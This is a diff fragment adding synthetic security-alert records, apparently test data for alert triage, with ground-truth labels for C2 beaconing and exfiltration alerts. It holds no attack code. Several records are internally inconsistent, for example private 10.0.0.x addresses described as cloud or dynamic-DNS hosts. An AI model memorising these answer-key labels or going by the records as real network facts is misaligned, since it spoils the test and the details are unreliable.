+    "description": "Large data exfiltration anomaly: 2.4 GB outbound stream over port 8443 to dynamic DNS host 52.216.14.8 during off-hours.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "suspicious_c2_outbound",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1071",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00268",
+    "timestamp": "2026-11-01T11:23:00Z",
+    "source_ip": "185.220.101.5",
+    "destination_ip": "185.199.108.153",
+    "user": "svc_sql",
+    "host": "ws-hr-104",
+    "event_type": "network_egress",
+    "description": "Zeek conn.log: Periodic beaconing detected 185.220.101.5 -> 185.199.108.153:443 jitter=2.3s interval=60s byte_ratio=0.98.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "suspicious_c2_outbound",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1071",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00772",
+    "timestamp": "2026-11-10T19:04:00Z",
+    "source_ip": "192.168.1.15",
+    "destination_ip": "52.216.14.8",
+    "user": "svc_backup",
+    "host": "app-web-01",
+    "event_type": "network_egress",
+    "description": "Large data exfiltration anomaly: 2.4 GB outbound stream over port 8443 to dynamic DNS host 52.216.14.8 during off-hours.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "suspicious_c2_outbound",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1071",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-01117",
+    "timestamp": "2026-11-19T01:55:00Z",
+    "source_ip": "45.142.214.10",
+    "destination_ip": "185.199.108.153",
+    "user": "j.watson",
+    "host": "jumpbox-01",
+    "event_type": "network_egress",
+    "description": "Zeek conn.log: Periodic beaconing detected 45.142.214.10 -> 185.199.108.153:443 jitter=2.3s interval=60s byte_ratio=0.98.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "suspicious_c2_outbound",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1071",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-01119",
+    "timestamp": "2026-11-12T20:35:00Z",
+    "source_ip": "103.208.220.5",
+    "destination_ip": "10.0.0.5",
+    "user": "svc_backup",
+    "host": "jumpbox-01",
+    "event_type": "network_egress",
+    "description": "Suricata ALERT: ET MALWARE Cobalt Strike Malleable C2 HTTP POST to unassigned cloud IP 10.0.0.5.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "suspicious_c2_outbound",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1071",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  },
+  {
+    "alert_id": "AL-EXP-00798",
+    "timestamp": "2026-11-20T11:48:00Z",
+    "source_ip": "172.16.50.4",
+    "destination_ip": "10.0.0.12",
+    "user": "j.watson",
+    "host": "dc-01.corp",
+    "event_type": "network_egress",
+    "description": "Large data exfiltration anomaly: 2.4 GB outbound stream over port 8443 to dynamic DNS host 10.0.0.12 during off-hours.",
+    "failed_attempts": 0,
+    "metadata": {
+      "ground_truth_category": "suspicious_c2_outbound",
+      "ground_truth_classification": "likely_true_positive",
+      "ground_truth_severity": "high",
+      "mitre_technique": "T1071",
+      "login_success_after_failures": false,
+      "approved_activity": false,
+      "sha256": null
+    }
+  }
+]
